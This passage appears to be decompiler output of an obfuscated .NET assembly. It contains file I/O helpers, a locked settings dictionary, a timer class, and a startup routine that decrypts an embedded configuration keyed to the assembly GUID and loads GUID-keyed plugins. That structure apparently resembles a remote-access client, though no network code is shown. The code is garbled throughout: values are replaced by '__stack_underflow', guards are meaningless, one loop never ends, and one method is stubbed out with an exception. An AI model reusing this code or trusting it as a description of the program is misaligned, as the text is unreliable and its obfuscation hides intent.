    }
    return local1;
}
// #=qEnv9WsExz6baZJKRUDupw9eEQbgJVjj69NjcsJ7hrBk=
public static bool #=q$c3lXLbhl3Qzil6Z9hYEopCTRdsG8WE_1ZuhF2KQELQ=(string arg1, long arg2, string arg3)
{
    string local0;
    System.IO.FileInfo local1;
    System.IO.FileStream local2;

    if (5 != 0)
    {
        local1 = __stack_underflow;
    }
    if (!(local1.Exists))
    {
        return false;
    }
    if (local1.Length != arg2)
    {
        return false;
    }
    if (7 != 0)
    {
        local2 = __stack_underflow;
    }
    if (3 != 0)
    {
        local0 = __stack_underflow;
    }
    local2.Close();
    return Microsoft.VisualBasic.CompilerServices.Operators.CompareString(local0, arg3, false) == 0;
}
// #=qEnv9WsExz6baZJKRUDupw9eEQbgJVjj69NjcsJ7hrBk=
public static bool #=qUlcwHJCewxIUk2tiKMDjXYc$Hb1k7TCZCyGdm6C93UA=(string arg1, long arg2, long arg3, string arg4)
{
    System.IO.FileInfo local0;
    string local2;
    System.IO.FileStream local3;

    if (4 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!(!local0.Exists))
    {
        if (local0.Length != arg2)
        {
            return false;
        }
        if (arg3 == unchecked((long)0))
        {
            return true;
        }
        if (6 != 0)
        {
            local3 = __stack_underflow;
        }
        if (2 != 0)
        {
            local2 = __stack_underflow;
        }
        local3.Close();
        return Microsoft.VisualBasic.CompilerServices.Operators.CompareString(local2, arg4, false) == 0;
    }
    if (arg3 != unchecked((long)0))
    {
        return false;
    }
    #=q9rPQSTp$UBZiTGc7mKlh7h1QvRgfs0p_mQAaIRjRIsQ=(arg1, 5242880, arg2);
    return true;
}
// #=qEnv9WsExz6baZJKRUDupw9eEQbgJVjj69NjcsJ7hrBk=
public static string #=qNn8WS2rooUJUoMsG84mQ7PkK4IQF8$E42cyDjfL7Kqc=(string arg1, long arg2)
{
    string local1;
    System.IO.FileStream local2;

    if (arg2 == unchecked((long)0))
    {
        return Empty;
    }
    if (5 != 0)
    {
        local2 = __stack_underflow;
    }
    if (3 != 0)
    {
        local1 = __stack_underflow;
    }
    local2.Close();
    return local1;
}
// #=qEnv9WsExz6baZJKRUDupw9eEQbgJVjj69NjcsJ7hrBk=
public static byte[] #=qoGHQsKlZ7jK$YeTeBpzDNYYM4Z1FIrOpXaDV$VTAdfM=(string arg1, long arg2, int arg3)
{
    byte[] local0;
    int local1;
    int local2;
    int local3;
    System.IO.FileStream local5;
    int local6;

    if (7 != 0)
    {
        local5 = __stack_underflow;
    }
    if (3 != 0)
    {
        local1 = __stack_underflow;
    }
    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    local5.Position = arg2;
    while (true)
    {
        local6 = (int)System.Math.Min(local5.Length - ((long)local2), (long)checked((int)local0.Length));
        local3 = local5.Read(local0, local2, local6);
        local2 = local2 + local3;
        if (local2 != checked((int)local0.Length))
        {
            continue;
        }
    }
    local5.Close();
    return local0;
}
// #=qEnv9WsExz6baZJKRUDupw9eEQbgJVjj69NjcsJ7hrBk=
public static void #=qkbMW3ViV2G4xkJU4KS4XYUwKzC$oNmhjZ49L9c8BrOM=(string arg1, byte[] arg2, long arg3)
{
    System.IO.FileStream local0;

    if (8 != 0)
    {
        local0 = __stack_underflow;
    }
    local0.Position = arg3;
    local0.Write(arg2, 0, checked((int)arg2.Length));
    local0.Close();
    return;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
public void .ctor()
{
    if (4 != 0)
    {
        __stack_underflow.#=qM9NIml9iDZh$Fjh9MocFWw== = __stack_underflow;
    }
    if (3 != 0)
    {
        __stack_underflow.#=qfGQBFs$OKLefNYKSta_Lbw== = __stack_underflow;
    }
    return;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
public void #=qWBzgr2CJEoV4DPIbUzdZZA==(#=qFgBBonKcV6U3Je0BKZZdAZdyEla0MkDel5SRrEzLUvs= arg1)
{
    if (6 != 0)
    {
        __stack_underflow.#=qUomzGDQTZY7jASgBmW35Fw== = __stack_underflow;
    }
    return;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
public void #=qYI$MiBdzcplbf7GqrUf7Ig==(#=qFgBBonKcV6U3Je0BKZZdAZdyEla0MkDel5SRrEzLUvs= arg1)
{
    if (2 != 0)
    {
        __stack_underflow.#=qUomzGDQTZY7jASgBmW35Fw== = __stack_underflow;
    }
    return;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
public int #=qXz2OER2RItZOjngvYurWLQ==()
{
    return ((0 == 0 ? this : this)).#=qnaTZqk95Z1a8JBLdKiF8aw==;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
public void #=qRvcNy1bY28C6xYdCX8MF7w==(int arg1)
{
    if (8 != 0)
    {
        __stack_underflow.#=qnaTZqk95Z1a8JBLdKiF8aw== = __stack_underflow;
    }
    if (!(!this.#=qc46h_4WA5z0UkWODs1nwXg==))
    {
        this.#=qM9NIml9iDZh$Fjh9MocFWw==.Change(0, this.#=qnaTZqk95Z1a8JBLdKiF8aw==);
    }
    return;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
public bool #=qe5qrWacQXGv9g0P5D_mRuQ==()
{
    return ((3 != 0 ? this : this)).#=qc46h_4WA5z0UkWODs1nwXg==;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
public void #=qgSHqO_KLHRARFg70SGn_Mw==(bool arg1)
{
    if (!((5 != 0 ? arg1 : arg1)))
    {
        ((0 == 0 ? this : this)).#=qkrqC_kLD0I$zOgfqD$aGaA==();
    }
    else
    {
        ((7 != 0 ? this : this)).#=qDH4GuNn5iW6RFhEPrfs$pQ==();
    }
    return;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
public void #=qDH4GuNn5iW6RFhEPrfs$pQ==()
{
    if (!(!this.#=qc46h_4WA5z0UkWODs1nwXg==))
    {
        return;
    }
    if (0 == 0)
    {
        __stack_underflow.#=qc46h_4WA5z0UkWODs1nwXg== = __stack_underflow;
    }
    this.#=qM9NIml9iDZh$Fjh9MocFWw==.Change(0, this.#=qnaTZqk95Z1a8JBLdKiF8aw==);
    return;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
public void #=qkrqC_kLD0I$zOgfqD$aGaA==()
{
    if (!(this.#=qc46h_4WA5z0UkWODs1nwXg==))
    {
        return;
    }
    if (4 != 0)
    {
        __stack_underflow.#=qc46h_4WA5z0UkWODs1nwXg== = __stack_underflow;
    }
    this.#=qM9NIml9iDZh$Fjh9MocFWw==.Change(-1, -1);
    return;
}
// #=qfLFZgbR_r0GETPSprP6O9w==
private void #=qS8q1FyJsn2_ukKh5ONBATg==(object arg1)
{
    object local0;
    #=qFgBBonKcV6U3Je0BKZZdAZdyEla0MkDel5SRrEzLUvs= local1;

    if (!(!this.#=qc46h_4WA5z0UkWODs1nwXg==))
    {
        if (-1 != 0)
        {
            local0 = __stack_underflow;
        }
        Microsoft.VisualBasic.CompilerServices.ObjectFlowControl.CheckForSyncLockOnValueType(local0);
        System.Threading.Monitor.Enter(local0);
        try
        {
            if (2 != 0)
            {
                local1 = __stack_underflow;
            }
        }
        finally
        {
        }
    }
    return;
}
// #=qixBu4j6Hm11f3$mLrzkCcE4AVWtWeNn5nQguwdGbWGg=
public void .ctor(#=qAfx0INrfgWoPN$Cz4VEZYVFcKNxFeYaixc4CaQpU$0g= arg1)
{
    if (8 != 0)
    {
        __stack_underflow.#=qAsxHG9v$MAI6$NruMbxEjA== = __stack_underflow;
    }
    if (3 != 0)
    {
        __stack_underflow.#=q4X5fhkJm5XS4LlpLIyB6bA== = __stack_underflow;
    }
    return;
}
// #=qixBu4j6Hm11f3$mLrzkCcE4AVWtWeNn5nQguwdGbWGg=
public object GetValue(string arg1, object arg2)
{
    object local0;
    System.Collections.Generic.Dictionary<string, object> local1;

    if (6 != 0)
    {
        local1 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local1);
    try
    {
        if (!this.#=q4X5fhkJm5XS4LlpLIyB6bA==.ContainsKey(arg1))
        {
            if (0 == 0)
            {
                local0 = __stack_underflow;
            }
        }
        else
        {
            if (3 != 0)
            {
                local0 = __stack_underflow;
            }
        }
    }
    finally
    {
    }
    return local0;
}
// #=qixBu4j6Hm11f3$mLrzkCcE4AVWtWeNn5nQguwdGbWGg=
public void SetValue(string arg1, object arg2)
{
    // disrobe: unstructured control flow has no legal target scope: goto IL_006D has no legal target scope; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // System.Collections.Generic.Dictionary<string, object> local0;
    // if (3 != 0)
    // {
    // local0 = __stack_underflow;
    // }
    // System.Threading.Monitor.Enter(local0);
    // try
    // {
    // if (!this.#=q4X5fhkJm5XS4LlpLIyB6bA==.ContainsKey(arg1))
    // {
    // this.#=q4X5fhkJm5XS4LlpLIyB6bA==.Add(arg1, System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(arg2));
    // IL_006D:;
    // if (this.#=qAsxHG9v$MAI6$NruMbxEjA== != null)
    // {
    // this.#=qAsxHG9v$MAI6$NruMbxEjA==.Invoke(arg1);
    // }
    // }
    // else
    // {
    // if (!this.#=q4X5fhkJm5XS4LlpLIyB6bA==[arg1].Equals(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(arg2)))
    // {
    // this.#=q4X5fhkJm5XS4LlpLIyB6bA==[arg1] = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(arg2);
    // goto IL_006D;
    // }
    // }
    // }
    // finally
    // {
    // }
    throw new System.NotSupportedException("disrobe: unstructured control flow has no legal target scope");
}
// #=qixBu4j6Hm11f3$mLrzkCcE4AVWtWeNn5nQguwdGbWGg=
public void RemoveValue(string arg1)
{
    bool local0;
    System.Collections.Generic.Dictionary<string, object> local1;

    if (4 != 0)
    {
        local1 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local1);
    try
    {
        if (!(!this.#=q4X5fhkJm5XS4LlpLIyB6bA==.ContainsKey(arg1)))
        {
            if (7 != 0)
            {
                local0 = __stack_underflow;
            }
            this.#=q4X5fhkJm5XS4LlpLIyB6bA==.Remove(arg1);
        }
    }
    finally
    {
    }
    if (!(!local0 || this.#=qAsxHG9v$MAI6$NruMbxEjA== == null))
    {
        this.#=qAsxHG9v$MAI6$NruMbxEjA==.Invoke(arg1);
    }
    return;
}
// #=qixBu4j6Hm11f3$mLrzkCcE4AVWtWeNn5nQguwdGbWGg=
public bool EntryExists(string arg1)
{
    bool local0;
    System.Collections.Generic.Dictionary<string, object> local1;

    if (2 != 0)
    {
        local1 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local1);
    try
    {
        if (6 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    finally
    {
    }
    return local0;
}
// #=qixBu4j6Hm11f3$mLrzkCcE4AVWtWeNn5nQguwdGbWGg=
public System.Collections.Generic.KeyValuePair<string, object>[] GetEntries()
{
    System.Collections.Generic.KeyValuePair<string, object>[] local0;
    System.Collections.Generic.Dictionary<string, object>.Enumerator local1;
    System.Collections.Generic.List<System.Collections.Generic.KeyValuePair<string, object>> local2;
    System.Collections.Generic.Dictionary<string, object> local3;
    System.Collections.Generic.KeyValuePair<string, object> local4;
    System.Collections.Generic.KeyValuePair<string, object> local5;
    System.Collections.Generic.KeyValuePair<string, object> local6;

    if (7 != 0)
    {
        local3 = __stack_underflow;
    }
    System.Threading.Monitor.Enter(local3);
    try
    {
        if (6 != 0)
        {
            local2 = __stack_underflow;
        }
    }
    finally
    {
    }
    return local0;
}
// #=qixBu4j6Hm11f3$mLrzkCcE4AVWtWeNn5nQguwdGbWGg=
public int #=q2gthvB62n07fYVTx5fwIqxBAo1t_hs$il9Ac$4FY_Gw=()
{
    int local1;

    if (0 == 0)
    {
        local1 = __stack_underflow;
    }
    this.#=q4X5fhkJm5XS4LlpLIyB6bA==.Clear();
    return local1;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void .cctor()
{
    if (3 != 0)
    {
        #=qi_z83UuaQZa6UsXCAahbTQ== = __stack_underflow;
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qf3c4WtE$$thN5QyBMvo3u0lth2VF5hmfUsIv1r8yRkg=()
{
    System.Windows.Forms.Application.add_ThreadException(#=qjlBNihUiUO2oBJbOEbdB4u8xmfTL9EQ3AEFa$nrdzJY=);
    CurrentDomain.add_UnhandledException(#=q5grPwgEurSn6KutVLS5_oPClPR_aCEdSRk5nKP5bDm4=);
    CurrentDomain.add_AssemblyResolve(#=q_FL69pQf17BUSAFbWYu1SStMAbdu$R1GJ8VY8UL5_EA=);
    if (3 != 0)
    {
        #=qfpNcQ8IYoPRIQgVc_nBfXzVjxVN2nY_mFz$PcDXaKKw= = __stack_underflow;
    }
    if (0 == 0)
    {
        #=qr5qpvOPnLxLp6aGkfAM7wQ== = __stack_underflow;
    }
    if (2 != 0)
    {
        #=qzjreg8z0D4BPrx4RxUJBoQ== = __stack_underflow;
    }
    #=q0myQQ6i89t9SZyjYDXZrBLa9ljWEUD7zAwJyyFZowQc= = new Dictionary<string, object>();
    CurrentDirectory = StartupPath;
    if (!(#=qlMIFeU84lweg5Ul5iSg2vZUvNnPKw11XA1pEUQfzDeg=()))
    {
        #=q8fYxP$_i6Xk0$6OlSwUHKcvhrevHxLXqXqvszBe9OtM=();
    }
    #=qr9m9EjuYAP$2E3p2xadfFhcTH6toAhrm0dlfOTldiWRsdXd8UmnkRkYrV_8$1gaA();
    #=qBpzegr6XzkmtwALf7kKPHV3RZVAWYLbYE79PiG2zXYs=();
    #=qfvzoVBS4j9KdxyngOlL_NauqVYLAaOZVw9dutKQSAp4=();
    #=qLJcloNvItceT7R54Ssv5HVCoj0j2JUUq_dQXQpFZZjM=();
    #=qKwlvi80KuDBelBsvucNuhRsqXRtqCfWqVH1dUPmd6_o=();
    #=qdzx0nDkNduYsJ$MOZBFb6jelzyvbyiG7So1vqpZnVLU=();
    #=qGgXamaT7IeK3DM0oRfGI7LZg7FrEWNz8CI_5MUlFEJw=();
    #=qF4e058OW__NtTzhWOs1UXEJiHrTSwnIZ3q2u9UaLbo49AZaoog8nMfoDeA9BGVvy();
    #=qgbI51haY38WJ4NumXDqnLC_uKv$aRHAyD63c9HgGYzlsFjikAASqT8RCSswEMouz();
    #=qwSPuuWVW8tz$gDazhda2d$myXXX0Ro_wRP7Rmm8JiiT9wA1EeeaPUV2jnUkQOCHa();
    #=qp9IgcHwNxIVh4GZl4S2tcJtSz0NII67aXwFNDcdhP63JHe9MNg0kPsAos3IUd98k();
    #=q6Aboe3ONIkez7GgqcdWPi0_vrT_i53_89HUeagGM6MThXvFkvl8hpSeHO1UJawKN();
    #=qFTBwGADWl13TibdOa5ODk_Y2qcfMGC4lp4rhrZcE84kZNE6dU4EqEk2ZYKuJAWo9();
    #=qVCHxDTr$$bwFMb6i9vBKRZciaa69edA3gsLNOty0RAzCorWRBUh2v0PgySYBEvZ0();
    #=qul8YRvQj1pWpo4_UxgOSzOBvtncEE$VPCzTeLK_rIz4EnXxineVkwF$lTxruKPxr();
    #=qphSRC1xHjYarc$NSFAVMID1iP8dwbr6BCaxyrkptDP0=();
    #=qcMb6hxBpdyTwCjvpzaQcC5dS3wbplPqOta7ERz_lMIo=();
    if (#=qmbdg4P9$2ouafwS8nEs4lA== != null)
    {
        #=qvPYkN4Wli543LScsy6rh$bZ0bDIN0tYd5zlNUibOEKfBRc13v6NIDRtsxPOZzKpX();
        #=qi6IJz6lHhd8GI6qygHcvTxSTD2wk_BSYwC2NR2eR0yg=();
    }
    #=qzRcQ_b8FoTlpKT_BObsgBl2bj71wU5HcYdpIIgiTJ5c=();
    #=qA1_qolTI9aVdwnEde3ubqM6zKBigTZiyb5_iHpeZQDI=();
    #=qyzEuYsQ6u9hwZeR0HeWqvA==();
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qA1_qolTI9aVdwnEde3ubqM6zKBigTZiyb5_iHpeZQDI=()
{
    if (4 != 0)
    {
        #=q6Xi08r0$lOOnXtoBHhfMuQ== = __stack_underflow;
    }
    #=q6Xi08r0$lOOnXtoBHhfMuQ==.#=qGjStw3GYbvUue5kapeAzmPJAl5$UDUb723PSvMiCGdU=(#=qFaxhQMbuEyPeOadTfKIzX7ulwKfSulnteVvHU$QDlcs=);
    #=q6Xi08r0$lOOnXtoBHhfMuQ==.#=qDTvHA26pSwiGBDknUzewBVNt3YGW7YeSiQRH8F$_CMA=(#=qQCd2OoCcjOFxsuzhZKv2M7$UnAX8JX19NdffDxgtv3I=);
    #=q6Xi08r0$lOOnXtoBHhfMuQ==.#=qs77tphQ2NXlLwCZkimhHsowpXGqSYmOGtKiGHHIs4aA=(#=qdwmMObmoGgv5eEpelZDrHiipw5mUgryufdcXXig375Q=);
    #=q6Xi08r0$lOOnXtoBHhfMuQ==.#=qEQtWieYw8BPdEE4hbsjTLrq$BwGjJOBoaDYJmV9xVgE=(#=qfXdNdmKHZO9pILMTQ4gUIFhfl9KPJm2rU8y_LQsTH4c=);
    #=q6Xi08r0$lOOnXtoBHhfMuQ==.#=qQoUfP$jAQrKMjDuqm54QmA==(#=qraB64nHTnRXCE4d7ffs5aGExarxpEh0COAPaEFI5iV8=);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qLJcloNvItceT7R54Ssv5HVCoj0j2JUUq_dQXQpFZZjM=()
{
    #=qq2h0VNJ4eWuHP5LphH0mpA== local0;

    if (0 == 0)
    {
        #=qFNeaOBvMHuebCbgh$0IKkw== = __stack_underflow;
    }
    if (0 == 0)
    {
        #=qVl3h61LTPSW_ew_st_OlTAm7x_6Xu4hQK$pi2fSiEIs= = __stack_underflow;
    }
    if (4 != 0)
    {
        #=q3LvM$oW1poDdLKDT_N_s4w== = __stack_underflow;
    }
    #=qBhG6LJNfmJspOR5A5YrkZB3a_dWOpJYSj4Mo9vfL8qo= = #=qjgz7ljmpp0J7FvL9dmi8ctJILdgtcbw8JYUc6GC8MeJ9B11Crfg2Djxcf0p8PZGe(#=qFNeaOBvMHuebCbgh$0IKkw==);
    #=qtcncUaS1HcVKUD5AEGHBokWqEL$GDDjoAu8asy_oLis= = System.IO.Path.Combine(System.IO.Path.Combine(#=qBhG6LJNfmJspOR5A5YrkZB3a_dWOpJYSj4Mo9vfL8qo=, #=q00kXQ$0a$SV9DIgRtf4NWQ==(516956323)), #=qeD3MBfedCIuKIQf9V1u2N3YS4VXE_FOHqw_XAjWtZK8=().ToString());
    #=qKoyC_0Y6bPLCPvDcJr2y5A== = #=qzB1OZ89gRpxcPckUn_afNY2d0beSpEyl40_4IarIxzM=(#=qBhG6LJNfmJspOR5A5YrkZB3a_dWOpJYSj4Mo9vfL8qo=);
    #=qq_SehjaC_F9U66vu1NLqjA== = OSVersion.Version.Major > 5;
    local0 = #=qLKYxZZVHP8wT4ocBxnjPXg==(#=qFNeaOBvMHuebCbgh$0IKkw==);
    #=qxLboOdsVFLmyLD939$tUsnUMYRMeFnzOLiWxQdY7sdc= = (&local0).#=qAR9aFFQPEovpFzvfokoGkw==;
    #=qKXWwuvxG9klNObPbc$UF0LIw0aZIk7Z0VPIncl8uFJQ= = (&local0).#=qPjPHWXGbaA$51Cna2ZaMpQ==;
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qGgXamaT7IeK3DM0oRfGI7LZg7FrEWNz8CI_5MUlFEJw=()
{
    System.Collections.Generic.KeyValuePair<string, object> local0;
    System.Collections.Generic.Dictionary<string, object>.Enumerator local1;

    #=q5j3wvJXlnrGmRnKUHr_1SQ==(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956242));
    try
    {
        if (2 != 0)
        {
            local1 = __stack_underflow;
        }
    }
    finally
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qphSRC1xHjYarc$NSFAVMID1iP8dwbr6BCaxyrkptDP0=()
{
    string local0;
    byte[] local1;
    object[] local2;
    System.Collections.Generic.List<System.Guid> local3;
    object local4;
    System.Collections.Generic.KeyValuePair<System.Guid, #=qDOdV5duF980CDFSFl8oQpw==> local5;
    System.Guid local6;
    System.Exception local7;
    int local8;
    object[] local9;
    System.Collections.Generic.Dictionary<System.Guid, #=qDOdV5duF980CDFSFl8oQpw==>.Enumerator local10;
    System.Collections.Generic.List<System.Guid>.Enumerator local11;

    if (7 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!(System.IO.File.Exists(local0)))
    {
        return;
    }
    try
    {
        if (1 != 0)
        {
            local1 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qP3lBpu0cs5q3Lf$qXSL7q6szA7E5M9NqMzkAFV6l4CI=(System.Guid[] arg1)
{
    string local0;
    byte[] local1;
    System.Collections.Generic.List<object> local2;
    System.Guid local3;
    System.Exception local4;
    int local5;
    System.Guid[] local6;

    if (3 != 0)
    {
        local0 = __stack_underflow;
    }
    try
    {
        if (7 != 0)
        {
            local2 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qcMb6hxBpdyTwCjvpzaQcC5dS3wbplPqOta7ERz_lMIo=()
{
    string local0;
    byte[] local1;
    System.DateTime local2;
    object[] local3;
    int local4;
    #=qDOdV5duF980CDFSFl8oQpw== local5;
    System.Exception local6;
    int local7;
    #=qDOdV5duF980CDFSFl8oQpw== local8;

    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    if (!(System.IO.File.Exists(local0)))
    {
        return;
    }
    try
    {
        if (8 != 0)
        {
            local1 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=q5OunwTi_tYTGCTkAtZ8rARxlhmXbFcAf_e1GiEt$FEA=()
{
    string local0;
    byte[] local1;
    System.Collections.Generic.List<object> local2;
    #=qbbSw65PC$nto6DJiWxTawg== local3;
    System.Exception local4;
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==>.Enumerator local5;

    if (5 != 0)
    {
        local0 = __stack_underflow;
    }
    try
    {
        if (0 == 0)
        {
            local2 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qi6IJz6lHhd8GI6qygHcvTxSTD2wk_BSYwC2NR2eR0yg=()
{
    #=qDOdV5duF980CDFSFl8oQpw== local0;
    System.Collections.Generic.KeyValuePair<System.Guid, #=qDOdV5duF980CDFSFl8oQpw==> local1;
    #=qbbSw65PC$nto6DJiWxTawg== local2;
    System.Collections.Generic.Dictionary<System.Guid, #=qDOdV5duF980CDFSFl8oQpw==>.Enumerator local3;

    #=q5j3wvJXlnrGmRnKUHr_1SQ==(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956646));
    try
    {
        if (7 != 0)
        {
            local3 = __stack_underflow;
        }
    }
    finally
    {
    }
    #=qzjreg8z0D4BPrx4RxUJBoQ==.Clear();
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
public static void #=qvPYkN4Wli543LScsy6rh$bZ0bDIN0tYd5zlNUibOEKfBRc13v6NIDRtsxPOZzKpX()
{
    if (!(!#=qrEy8UTPh_zjKUNPlgJ2H5vQaVxSgPloAxSMCkFttuk8=))
    {
        return;
    }
    if (-1 != 0)
    {
        #=qrEy8UTPh_zjKUNPlgJ2H5vQaVxSgPloAxSMCkFttuk8= = __stack_underflow;
    }
    if (5 != 0)
    {
        #=qalo3zYdlWWh$dYSx9JnNrw== = __stack_underflow;
    }
    if (2 != 0)
    {
        #=q0yJsLo0aFpSu9ky8R9f$lw== = __stack_underflow;
    }
    #=qQrBlfreeUYUGyN3hPOorGA== = new #=qixBu4j6Hm11f3$mLrzkCcE4AVWtWeNn5nQguwdGbWGg=(#=qDt_4RPbN$YmUyKsVRrbzrjU6uaXWwjHkaZoJAcuFCCs=);
    #=qs4p7qYamgHyRCYZsTKM03Q== = new #=qixBu4j6Hm11f3$mLrzkCcE4AVWtWeNn5nQguwdGbWGg=(#=q7EIL8N8VWglyI984D7TGpzIPvdOcvYIRRwfMeKNyDDs=);
    #=qCJD3QzeNpOG7t7hUNPqgxgwPhMjv4aui2ikN049iz28= = new #=qQkx1bBZns8hPde7$PcvfUl2fAairj6t_H8ve7nJO2s3BIB3t7PXd4ZR9h0JHyxrX(#=q0myQQ6i89t9SZyjYDXZrBLa9ljWEUD7zAwJyyFZowQc=);
    #=qwogjI4gN1imp1VeWLroXTk41PgYeLQ34zunh6NYu_3g=();
    #=qRxR4aJg8TX8oM$OpeoviZQ==(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956554));
    #=q2nHH3haw3R0VWVw4qHOwKw== = new #=qfLFZgbR_r0GETPSprP6O9w==();
    #=q2nHH3haw3R0VWVw4qHOwKw==.#=qWBzgr2CJEoV4DPIbUzdZZA==(#=qxH0vEx09STdEljqb$W1E7jvc94T2TeZBAEeRdiG1_PA=);
    #=q2nHH3haw3R0VWVw4qHOwKw==.#=qRvcNy1bY28C6xYdCX8MF7w==(1000);
    #=q2nHH3haw3R0VWVw4qHOwKw==.#=qDH4GuNn5iW6RFhEPrfs$pQ==();
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qwogjI4gN1imp1VeWLroXTk41PgYeLQ34zunh6NYu_3g=()
{
    #=qQrBlfreeUYUGyN3hPOorGA==.SetValue(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956607), #=qFNeaOBvMHuebCbgh$0IKkw==);
    #=qQrBlfreeUYUGyN3hPOorGA==.SetValue(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956588), #=qKoyC_0Y6bPLCPvDcJr2y5A==);
    #=qQrBlfreeUYUGyN3hPOorGA==.SetValue(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956481), #=qVl3h61LTPSW_ew_st_OlTAm7x_6Xu4hQK$pi2fSiEIs=);
    #=qQrBlfreeUYUGyN3hPOorGA==.SetValue(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956534), #=qq_SehjaC_F9U66vu1NLqjA==);
    #=qQrBlfreeUYUGyN3hPOorGA==.SetValue(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956525), #=qBhG6LJNfmJspOR5A5YrkZB3a_dWOpJYSj4Mo9vfL8qo=);
    #=qQrBlfreeUYUGyN3hPOorGA==.SetValue(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956421), #=qxLboOdsVFLmyLD939$tUsnUMYRMeFnzOLiWxQdY7sdc=);
    #=qQrBlfreeUYUGyN3hPOorGA==.SetValue(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956476), #=qKXWwuvxG9klNObPbc$UF0LIw0aZIk7Z0VPIncl8uFJQ=);
    #=qQrBlfreeUYUGyN3hPOorGA==.SetValue(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956889), #=q3LvM$oW1poDdLKDT_N_s4w==);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qKwlvi80KuDBelBsvucNuhRsqXRtqCfWqVH1dUPmd6_o=()
{
    if (2 != 0)
    {
        #=qnnmAgQGEsJw4dsVn9gN4wJbRL4WqsDa_V0QuBPM2E4A= = __stack_underflow;
    }
    if (3 != 0)
    {
        #=qKaOsg8ghd7KyYDCm3RhDg9KJrf7McwaH92TdOJzSw6s= = __stack_underflow;
    }
    if (2 != 0)
    {
        #=qwVGSEK8LoRuNWEOYfq8$hq39mmxHzM3pIeoRef7XNt8= = __stack_underflow;
    }
    #=qGPdnFVTlqnS4tiFpuQulXa$2eC7Pe6YqVeImkUGsMl0= = System.IO.Path.Combine(System.Environment.GetFolderPath((System.Environment.SpecialFolder)38), #=qKaOsg8ghd7KyYDCm3RhDg9KJrf7McwaH92TdOJzSw6s=);
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static void #=qdzx0nDkNduYsJ$MOZBFb6jelzyvbyiG7So1vqpZnVLU=()
{
    string local0;
    System.Exception local1;
    int local2;
    string[] local3;

    if (1 != 0)
    {
        #=q79YE7jk$t8I7uIUVykHcVA== = __stack_underflow;
    }
    try
    {
        if (System.IO.Directory.Exists(#=qtcncUaS1HcVKUD5AEGHBokWqEL$GDDjoAu8asy_oLis=))
        {
            if (8 != 0)
            {
                local3 = __stack_underflow;
            }
            if (8 != 0)
            {
                local2 = __stack_underflow;
            }
            while (local2 < checked((int)local3.Length))
            {
                local0 = local3[local2];
                #=q79YE7jk$t8I7uIUVykHcVA==.Enqueue(System.IO.Path.GetFileNameWithoutExtension(local0));
                local2 = local2 + 1;
                continue;
            }
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=qjIje6jGWLd2EOkfZXKqBbg==
private static bool #=qlMIFeU84lweg5Ul5iSg2vZUvNnPKw11XA1pEUQfzDeg=()
{
    byte[] local1;
    System.Guid local2;
    byte[] local3;
    System.IO.BinaryReader local4;
    System.IO.MemoryStream local5;
    int local6;
    object[] local7;
    object[] local8;
    byte[] local9;
    object[] local10;

    if (0 == 0)
    {
        local1 = __stack_underflow;
    }
    if (local1 == null)
    {
        return false;
    }
    if (3 != 0)
    {
        local5 = __stack_underflow;
    }
    if (6 != 0)
    {
        local4 = __stack_underflow;
    }
    local3 = local4.ReadBytes(local4.ReadInt32());
    local2 = #=q0QKFCbf0u_IpV5ISOWOl$Q==(System.Reflection.Assembly.GetExecutingAssembly());
    #=qy_aVo5ze7CCnCYXCQvhVBg== = #=q8uMGC19QD5WGzpkzUOu0SQ==(local3, local2);
